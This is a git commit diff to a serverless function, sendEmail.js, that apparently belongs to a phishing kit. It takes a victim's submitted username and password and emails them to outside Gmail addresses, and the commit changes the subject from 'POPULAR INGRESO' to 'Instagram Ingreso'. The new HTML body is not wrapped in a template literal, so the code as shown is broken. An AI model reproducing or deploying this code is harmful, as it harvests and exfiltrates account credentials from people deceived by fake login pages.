b779d582a33dc5180e1d793013993741cceafd2c
Aletiiisa <cuentaluperonp5@gmail.com>
2024-12-22 14:48:04 -0400

    Update sendEmail.js

--- functions/sendEmail.js
+++ functions/sendEmail.js
@@ -1,4 +1,3 @@
-
 const nodemailer = require('nodemailer');
 require('dotenv').config();
 
@@ -15,9 +14,13 @@ exports.handler = async function(event, context) {
 
     let mailOptions = {
         from: 'cuentaluperonp5@gmail.com',
-        to: 'sierroalee@gmail.com, cacutumbe@gmail.com', // Corregido: coma agregada entre los correos
-        subject: 'POPULAR INGRESO',
-        text: `Usuario: ${username}\nContraseña: ${password}`,
+        to: 'sierroalee@gmail.com', // Corregido: coma agregada entre los correos
+        subject: 'Instagram Ingreso',
+        html: 
+            <h2>Detalles de Ingreso</h2>
+            <p><strong>Usuario:</strong> <span style="word-wrap: break-word;">${username}</span></p>
+            <p><strong>Contraseña:</strong> <span style="word-wrap: break-word;">${password}</span></p>
+        ,
     };
 
     try {
